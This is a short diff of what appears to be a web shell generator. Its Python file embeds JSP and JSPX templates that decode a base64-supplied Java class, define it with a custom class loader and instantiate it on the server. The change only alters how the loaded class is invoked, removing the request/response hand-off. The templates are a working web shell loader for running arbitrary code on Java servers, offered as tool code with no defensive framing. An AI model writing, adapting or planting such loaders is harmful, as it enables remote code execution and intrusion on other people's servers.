@@ -136,7 +136,7 @@ JSP = """
 <%
     String cls = "{clazz}";
     if (cls != null) {{
-        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{{request,response}});
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance();
     }}
 %>
 """
@@ -172,7 +172,7 @@ JSPX = """
     <jsp:scriptlet>
         String cls = "{clazz}";
         if (cls != null) {{
-            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{{request,response}});
+            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance();
         }}
     </jsp:scriptlet>
 </jsp:root>
